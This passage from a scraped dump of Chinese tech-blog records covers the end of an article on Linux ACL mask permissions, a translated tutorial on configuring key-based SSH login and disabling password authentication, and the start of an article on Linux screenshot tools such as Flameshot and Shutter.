ACL_GROUP 条目的最大权限，所以在应用了 ACL_MASK 条目后，需要通过 effective 权限来获得 ACL_USER、ACL_GROUP_OBJ 和 ACL_GROUP 条目的真正权限(如上图所示)。当 ACL_USER、ACL_GROUP_OBJ 和 ACL_GROUP 条目,包含不包含在 ACL_MASK 条目中的权限,，则该条目后面会有一个 “#” 号和字符串 “effective”，以及该条目的有效访问权限。,\n,但是 mask 只对 ACL_USER、ACL_GROUP_OBJ 和 ACL_GROUP 条目有影响(红框中的内容)，对 owner 和 other 的权限是没有任何影响的。,\n**************************************************************,\n,总结,\n,本文先介绍了 ACL 权限中的基本概念，然后解释了笔者在使用 ACL 权限过程中碰到的一些疑问。希望这些内容可以帮助大家更好的理解和使用 ACL 权限。,\n,参考：,\n,acl man page,\n,POSIX Access Control Lists on Linux,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114420/", "url_object_id": "36f311781e86fa8ddc95a939b8b92660", "front_image_path": "full/d3d1a5ad957de059084690efae6fdfaa3527e1c3.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/02/linux-ssh.jpg"], "title": "如何在 Linux 中配置基于密钥认证的 SSH", "create_time": "2018/10/05", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,SK,   译文出处：,Linux中国/LuMing,   ,什么是基于 SSH 密钥的认证？,\n,众所周知，,Secure Shell,，又称 ,SSH,，是允许你通过无安全网络（例如 Internet）和远程系统之间安全访问/通信的加密网络协议。无论何时使用 SSH 在无安全网络上发送数据，它都会在源系统上自动地被加密，并且在目的系统上解密。SSH 提供了四种加密方式，,基于密码认证,，,基于密钥认证,，,基于主机认证,和,键盘认证,。最常用的认证方式是基于密码认证和基于密钥认证。,\n,在基于密码认证中，你需要的仅仅是远程系统上用户的密码。如果你知道远程用户的密码，你可以使用 ,ssh user@remote-system-name, 访问各自的系统。另一方面，在基于密钥认证中，为了通过 SSH 通信，你需要生成 SSH 密钥对，并且为远程系统上传 SSH 公钥。每个 SSH 密钥对由私钥与公钥组成。私钥应该保存在客户系统上，公钥应该上传给远程系统。你不应该将私钥透露给任何人。希望你已经对 SSH 和它的认证方式有了基本的概念。,\n,这篇教程，我们将讨论如何在 Linux 上配置基于密钥认证的 SSH。,\n,在 Linux 上配置基于密钥认证的 SSH,\n,为方便演示，我将使用 Arch Linux 为本地系统，Ubuntu 18.04 LTS 为远程系统。,\n,本地系统详情：,\n,\n,OS: Arch Linux Desktop,\n,IP address: 192.168.225.37/24,\n,\n,远程系统详情：,\n,\n,OS: Ubuntu 18.04 LTS Server,\n,IP address: 192.168.225.22/24,\n,\n,本地系统配置,\n,就像我之前所说，在基于密钥认证的方法中，想要通过 SSH 访问远程系统，需要将公钥上传到远程系统。公钥通常会被保存在远程系统的一个 ,~/.ssh/authorized_keys, 文件中。,\n,注意事项,：不要使用 ,root, 用户生成密钥对，这样只有 root 用户才可以使用。使用普通用户创建密钥对。,\n,现在，让我们在本地系统上创建一个 SSH 密钥对。只需要在客户端系统上运行下面的命令。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ssh-keygen,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ssh,-,keygen,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面的命令将会创建一个 2048 位的 RSA 密钥对。你需要输入两次密码。更重要的是，记住你的密码。后面将会用到它。,\n,样例输出,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nGenerating public/private rsa key pair.\r\nEnter file in which to save the key (/home/sk/.ssh/id_rsa):\r\nEnter passphrase (empty for no passphrase):\r\nEnter same passphrase again:\r\nYour identification has been saved in /home/sk/.ssh/id_rsa.\r\nYour public key has been saved in /home/sk/.ssh/id_rsa.pub.\r\nThe key fingerprint is:\r\nSHA256:wYOgvdkBgMFydTMCUI3qZaUxvjs+p2287Tn4uaZ5KyE [email protected]\r\nThe key's randomart image is:\r\n+---[RSA 2048]----+\r\n|+=+*= + |\r\n|o.o=.* = |\r\n|.oo * o + |\r\n|. = + . o |\r\n|. o + . S |\r\n| . E . |\r\n| + o |\r\n| +.*o+o |\r\n| .o*=OO+ |\r\n+----[SHA256]-----+,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Generating ,public,/,private, ,rsa ,key ,pair,.,Enter ,file ,in, ,which ,to, ,save ,the ,key, ,(,/,home,/,sk,/,.,ssh,/,id_rsa,),:,Enter ,passphrase, ,(,empty ,for, ,no ,passphrase,),:,Enter ,same ,passphrase ,again,:,Your ,identification ,has ,been ,saved ,in, ,/,home,/,sk,/,.,ssh,/,id_rsa,.,Your ,public, ,key ,has ,been ,saved ,in, ,/,home,/,sk,/,.,ssh,/,id_rsa,.,pub,.,The ,key ,fingerprint ,is,:,SHA256,:,wYOgvdkBgMFydTMCUI3qZaUxvjs,+,p2287Tn4uaZ5KyE, ,[,email, ,protected,],The ,key,',s, ,randomart ,image ,is,:,+,--,-,[,RSA, ,2048,],--,--,+,|,+=,+,*=, ,+, ,|,|,o,.,o,=,.,*, ,=, ,|,|,.,oo *, ,o, ,+, ,|,|,., ,=, ,+, ,., ,o, ,|,|,., ,o, ,+, ,., ,S, ,|,|, ,., ,E, ,., ,|,|, ,+, ,o, ,|,|, ,+,.,*,o,+,o, ,|,|, ,.,o*,=,OO,+, ,|,+,--,--,[,SHA256,],--,--,-,+,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你已经创建了密钥对，你将看到以下信息。输入 ,y, 就会覆盖已存在的密钥。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/home/username/.ssh/id_rsa already exists.\r\nOverwrite (y/n)?,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/,home,/,username,/,.,ssh,/,id_rsa ,already ,exists,.,Overwrite, ,(,y,/,n,),?,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,请注意,密码是可选的,。如果你输入了密码，那么每次通过 SSH 访问远程系统时都要求输入密码，除非你使用了 SSH 代理保存了密码。如果你不想要密码（虽然不安全），简单地敲两次回车。不过，我建议你使用密码。从安全的角度来看，使用无密码的 ssh 密钥对不是什么好主意。这种方式应该限定在特殊的情况下使用，例如，没有用户介入的服务访问远程系统。（例如，用 ,rsync, 远程备份……）,\n,如果你已经在个人文件 ,~/.ssh/id_rsa, 中有了无密码的密钥，但想要更新为带密码的密钥。使用下面的命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ssh-keygen -p -f ~/.ssh/id_rsa,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ssh,-,keygen, ,-,p, ,-,f, ,~,/,.,ssh,/,id_rsa,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,样例输出,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEnter new passphrase (empty for no passphrase):\r\nEnter same passphrase again:\r\nYour identification has been saved with the new passphrase.,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Enter ,new, ,passphrase, ,(,empty ,for, ,no ,passphrase,),:,Enter ,same ,passphrase ,again,:,Your ,identification ,has ,been ,saved ,with ,the ,new, ,passphrase,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在，我们已经在本地系统上创建了密钥对。接下来，使用下面的命令将 SSH 公钥拷贝到你的远程 SSH 服务端上。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ssh-copy-id sk@192.168.225.22,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ssh,-,copy,-,id ,sk,@,192.168.225.22,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在这里，我把本地（Arch Linux）系统上的公钥拷贝到了远程系统（Ubuntu 18.04 LTS）上。从技术上讲，上面的命令会把本地系统 ,~/.ssh/id_rsa.pub, 文件中的内容拷贝到远程系统 ,~/.ssh/authorized_keys, 中。明白了吗？非常棒。,\n,输入 ,yes, 来继续连接你的远程 SSH 服务端。接着，输入远程系统用户 ,sk, 的密码。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed\r\n/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys\r\nsk@192.168.225.22's password:\r\n\r\nNumber of key(s) added: 1\r\n\r\nNow try logging into the machine, with: \"ssh 'sk@192.168.225.22'\"\r\nand check to make sure that only the key(s) you wanted were added.,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/,usr,/,bin,/,ssh,-,copy,-,id,:, ,INFO,:, ,attempting ,to, ,log ,in, ,with ,the ,new, ,key,(,s,),,, ,to, ,filter ,out ,any ,that ,are ,already ,installed,/,usr,/,bin,/,ssh,-,copy,-,id,:, ,INFO,:, ,1, ,key,(,s,), ,remain ,to, ,be ,installed, ,--, ,if, ,you ,are ,prompted ,now ,it ,is, ,to, ,install ,the ,new, ,keys,sk,@,192.168.225.22,'s password:, ,Number of key(s) added: 1, ,Now try logging into the machine, with: \"ssh ',sk,@,192.168.225.22,'\",and, ,check ,to, ,make ,sure ,that ,only ,the ,key,(,s,), ,you ,wanted ,were ,added,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你已经拷贝了密钥，但想要替换为新的密码，使用 ,-f, 选项覆盖已有的密钥。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ssh-copy-id -f sk@192.168.225.22,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ssh,-,copy,-,id, ,-,f, ,sk,@,192.168.225.22,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们现在已经成功地将本地系统的 SSH 公钥添加进了远程系统。现在，让我们在远程系统上完全禁用掉基于密码认证的方式。因为我们已经配置了密钥认证，因此不再需要密码认证了。,\n,在远程系统上禁用基于密码认证的 SSH,\n,你需要在 root 用户或者 ,sudo, 执行下面的命令。,\n,禁用基于密码的认证，你需要在远程系统的终端里编辑 ,/etc/ssh/sshd_config, 配置文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo vi /etc/ssh/sshd_config,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,vi, ,/,etc,/,ssh,/,sshd_config,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,找到下面这一行，去掉注释然后将值设为 ,no,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nPasswordAuthentication no,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,PasswordAuthentication ,no,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,重启 ssh 服务让它生效。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo systemctl restart sshd,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,systemctl ,restart ,sshd,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,从本地系统访问远程系统,\n,在本地系统上使用命令 SSH 你的远程服务端：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ssh sk@192.168.225.22,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ssh ,sk,@,192.168.225.22,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输入密码。,\n,样例输出,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEnter passphrase for key '/home/sk/.ssh/id_rsa':\r\nLast login: Mon Jul 9 09:59:51 2018 from 192.168.225.37\r\nsk@ubuntuserver:~$,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Enter ,passphrase ,for, ,key, ,'/home/sk/.ssh/id_rsa',:,Last ,login,:, ,Mon ,Jul, ,9, ,09,:,59,:,51, ,2018, ,from, ,192.168.225.37,sk,@,ubuntuserver,:,~,$,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在，你就能 SSH 你的远程系统了。如你所见，我们已经使用之前 ,ssh-keygen, 创建的密码登录进了远程系统的账户，而不是使用当前账户实际的密码。,\n,如果你试图从其它客户端系统 ssh（远程系统），你将会得到这条错误信息。比如，我试图通过命令从 CentOS SSH 访问 Ubuntu 系统：,\n,样例输出,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nThe authenticity of host '192.168.225.22 (192.168.225.22)' can't be established.\r\nECDSA key fingerprint is 67:fc:69:b7:d4:4d:fd:6e:38:44:a8:2f:08:ed:f4:21.\r\nAre you sure you want to continue connecting (yes/no)? yes\r\nWarning: Permanently added '192.168.225.22' (ECDSA) to the list of known hosts.\r\nPermission denied (publickey).,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,The ,authenticity ,of ,host, ,'192.168.225.22 (192.168.225.22)', ,can,'t be established.,ECDSA key fingerprint is 67:fc:69:b7:d4:4d:fd:6e:38:44:a8:2f:08:ed:f4:21.,Are you sure you want to continue connecting (yes/no)? yes,Warning: Permanently added ',192.168.225.22,', ,(,ECDSA,), ,to, ,the ,list ,of ,known ,hosts,.,Permission ,denied, ,(,publickey,),.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如你所见，除了 CentOS（LCTT 译注：根据上文，这里应该是 Arch）系统外，我不能通过其它任何系统 SSH 访问我的远程系统 Ubuntu 18.04。,\n,为 SSH 服务端添加更多客户端系统的密钥,\n,这点非常重要。就像我说过的那样，除非你配置过（在之前的例子中，是 Ubuntu），否则你不能通过 SSH 访问到远程系统。如果我希望给更多客户端予以权限去访问远程 SSH 服务端，我应该怎么做？很简单。你需要在所有的客户端系统上生成 SSH 密钥对并且手动拷贝 ssh 公钥到想要通过 ssh 访问的远程服务端上。,\n,在客户端系统上创建 SSH 密钥对，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ssh-keygen,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ssh,-,keygen,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输入两次密码。现在，ssh 密钥对已经生成了。你需要手动把公钥（不是私钥）拷贝到远程服务端上。,\n,使用以下命令查看公钥：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cat ~/.ssh/id_rsa.pub,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cat, ,~,/,.,ssh,/,id_rsa,.,pub,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,应该会输出类似下面的信息：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCt3a9tIeK5rPx9p74/KjEVXa6/OODyRp0QLS/sLp8W6iTxFL+UgALZlupVNgFjvRR5luJ9dLHWwc+d4umavAWz708e6Na9ftEPQtC28rTFsHwmyLKvLkzcGkC5+A0NdbiDZLaK3K3wgq1jzYYKT5k+IaNS6vtrx5LDObcPNPEBDt4vTixQ7GZHrDUUk5586IKeFfwMCWguHveTN7ykmo2EyL2rV7TmYq+eY2ZqqcsoK0fzXMK7iifGXVmuqTkAmZLGZK8a3bPb6VZd7KFum3Ezbu4BXZGp7FVhnOMgau2kYeOH/ItKPzpCAn+dg3NAAziCCxnII9b4nSSGz3mMY4Y7 ostechnix@centosserver,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,ssh,-,rsa ,AAAAB3NzaC1yc2EAAAADAQABAAABAQCt3a9tIeK5rPx9p74,/,KjEVXa6,/,OODyRp0QLS,/,sLp8W6iTxFL,+,UgALZlupVNgFjvRR5luJ9dLHWwc,+,d4umavAWz708e6Na9ftEPQtC28rTFsHwmyLKvLkzcGkC5,+,A0NdbiDZLaK3K3wgq1jzYYKT5k,+,IaNS6vtrx5LDObcPNPEBDt4vTixQ7GZHrDUUk5586IKeFfwMCWguHveTN7ykmo2EyL2rV7TmYq,+,eY2ZqqcsoK0fzXMK7iifGXVmuqTkAmZLGZK8a3bPb6VZd7KFum3Ezbu4BXZGp7FVhnOMgau2kYeOH,/,ItKPzpCAn,+,dg3NAAziCCxnII9b4nSSGz3mMY4Y7 ,ostechnix,@,centosserver,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,拷贝所有内容（通过 USB 驱动器或者其它任何介质），然后去你的远程服务端的终端，像下面那样，在 ,$HOME, 下创建文件夹叫做 ,.ssh,。你需要以 root 身份执行命令（注：不一定需要 root）。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ mkdir -p ~/.ssh,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,mkdir, ,-,p, ,~,/,.,ssh,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在，将前几步创建的客户端系统的公钥添加进文件中。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\necho {Your_public_key_contents_here} >> ~/.ssh/authorized_keys,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,echo, ,{,Your_public_key_contents_here,}, ,>>, ,~,/,.,ssh,/,authorized_keys,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在远程系统上重启 ssh 服务。现在，你可以在新的客户端上 SSH 远程服务端了。,\n,如果觉得手动添加 ssh 公钥有些困难，在远程系统上暂时性启用密码认证，使用 ,ssh-copy-id, 命令从本地系统上拷贝密钥，最后禁用密码认证。,\n,推荐阅读：,\n,\n,SSLH – Share A Same Port For HTTPS And SSH,\n,ScanSSH – Fast SSH Server And Open Proxy Scanner,\n,\n,好了，到此为止。基于密钥认证的 SSH 提供了一层防止暴力破解的额外保护。如你所见，配置密钥认证一点也不困难。这是一个非常好的方法让你的 Linux 服务端安全可靠。,\n, ,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114432/", "url_object_id": "d54b95389c6e64cc38cb108973c2fec5", "front_image_path": "full/98a52c8c3ed8309e75c9e35b93c021e132ab36b2.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/10/c6528446cd46bec21d44fdbab9664596.png"], "title": "在 Linux 下截屏并编辑的最佳工具", "create_time": "2018/10/07", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Ankush Das,   译文出处：,Linux中国/Hank Chow,   ,有几种获取屏幕截图并对其进行添加文字、箭头等编辑的方法，这里提及的的屏幕截图工具在 Ubuntu 和其它主流 Linux 发行版中都能够使用。,\n,\n,当我的主力操作系统从 Windows 转换到 Ubuntu 的时候，首要考虑的就是屏幕截图工具的可用性。尽管使用默认的键盘快捷键也可以获取屏幕截图，但如果使用屏幕截图工具，可以更方便地对屏幕截图进行编辑。,\n,本文将会介绍在不适用第三方工具的情况下，如何通过系统自带的方法和工具获取屏幕截图，另外还会介绍一些可用于 Linux 的最佳截图工具。,\n,方法 1：在 Linux 中截图的默认方式,\n,你想要截取整个屏幕？屏幕中的某个区域？某个特定的窗口？,\n,如果只需要获取一张屏幕截图，不对其进行编辑的话，那么键盘的默认快捷键就可以满足要求了。而且不仅仅是 Ubuntu ，绝大部分的 Linux 发行版和桌面环境都支持以下这些快捷键：,\n,\n,PrtSc, – 获取整个屏幕的截图并保存到 Pictures 目录。,\n,Shift + PrtSc, – 获取屏幕的某个区域截图并保存到 Pictures 目录。,\n,Alt + PrtSc, –获取当前窗口的截图并保存到 Pictures 目录。,\n,Ctrl + PrtSc, – 获取整个屏幕的截图并存放到剪贴板。,\n,Shift + Ctrl + PrtSc, – 获取屏幕的某个区域截图并存放到剪贴板。,\n,Ctrl + Alt + PrtSc, – 获取当前窗口的 截图并存放到剪贴板。,\n,\n,如上所述，在 Linux 中使用默认的快捷键获取屏幕截图是相当简单的。但如果要在不把屏幕截图导入到其它应用程序的情况下对屏幕截图进行编辑，还是使用屏幕截图工具比较方便。,\n,方法 2：在 Linux 中使用 Flameshot 获取屏幕截图并编辑,\n,\n,功能概述：,\n,\n,注释 (高亮、标示、添加文本、框选),\n,图片模糊,\n,图片裁剪,\n,上传到 Imgur,\n,用另一个应用打开截图,\n,\n,Flameshot 在去年发布到 ,GitHub,，并成为一个引人注目的工具。,\n,如果你需要的是一个能够用于标注、模糊、上传到 imgur 的新式截图工具，那么 Flameshot 是一个好的选择。,\n,下面将会介绍如何安装 Flameshot 并根据你的偏好进行配置。,\n,如果你用的是 Ubuntu，那么只需要在 Ubuntu 软件中心上搜索，就可以找到 Flameshot 进而完成安装了。要是你想使用终端来安装，可以执行以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo apt install flameshot,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,apt ,install ,flameshot,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你在安装过程中遇到问题，可以按照,官方的安装说明,进行操作。安装完成后，你还需要进行配置。尽管可以通过搜索来随时启动 Flameshot，但如果想使用 ,PrtSc, 键触发启动，则需要指定对应的键盘快捷键。以下是相关配置步骤：,\n,\n,进入系统设置中的“键盘设置”,\n,页面中会列出所有现有的键盘快捷键，拉到底部就会看见一个 “+” 按钮,\n,点击 “+” 按钮添加自定义快捷键并输入以下两个字段：\n,\n,“名称”： 任意名称均可。,\n,“命令”： ,/usr/bin/flameshot gui,\n,\n,\n,最后将这个快捷操作绑定到 ,PrtSc, 键上，可能会提示与系统的截图功能相冲突，但可以忽略掉这个警告。,\n,\n,配置之后，你的自定义快捷键页面大概会是以下这样：,\n,\n,将键盘快捷键映射到 Flameshot,\n,方法 3：在 Linux 中使用 Shutter 获取屏幕截图并编辑,\n,\n,功能概述：,\n,\n,注释 (高亮、标示、添加文本、框选),\n,图片模糊,\n,图片裁剪,\n,上传到图片网站,\n,\n,Shutter, 是一个对所有主流 Linux 发行版都适用的屏幕截图工具。尽管最近已经不太更新了，但仍然是操作屏幕截图的一个优秀工具。,\n,在使用过程中可能会遇到这个工具的一些缺陷。Shutter 在任何一款最新的 Linux 发行版上最常见的问题就是由于缺少了任务栏上的程序图标，导致默认禁用了编辑屏幕截图的功能。 对于这个缺陷，还是有解决方案的。你只需要跟随我们的教程,在 Shutter 中修复这个禁止编辑选项并将程序图标在任务栏上显示出来,。问题修复后，就可以使用 Shutter 来快速编辑屏幕截图了。,\n,同样地，在软件中心搜索也可以找到进而安装 Shutter，也可以在基于 Ubuntu 的发行版中执行以下命令使用命令行安装：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo apt install shutter,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,apt ,install ,shutter,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,类似 Flameshot，你可以通过搜索 Shutter 手动启动它，也可以按照相似的方式设置自定义快捷方式以 ,PrtSc, 键唤起 Shutter。,\n,如果要指定自定义键盘快捷键，只需要执行以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nshutter -f,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,shutter, ,-,f,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,方法 4：在 Linux 中使用 GIMP 获取屏幕截图,\n,\n,功能概述：,\n,\n,高级图像编辑功能（缩放、添加滤镜、颜色校正、添加图层、裁剪等）,\n,截取某一区域的屏幕截图,\n,\n,如果需要对屏幕截图进行一些预先编辑，GIMP 是一个不错的选择。,\n,通过软件中心可以安装 GIMP。如果在安装时遇到问题，可以参考其,官方网站的安装说明,。,\n,要使用 GIMP 获取屏幕截图，需要先启动程序，然后通过 “File-> Create-> Screenshot” 导航。,\n,打开 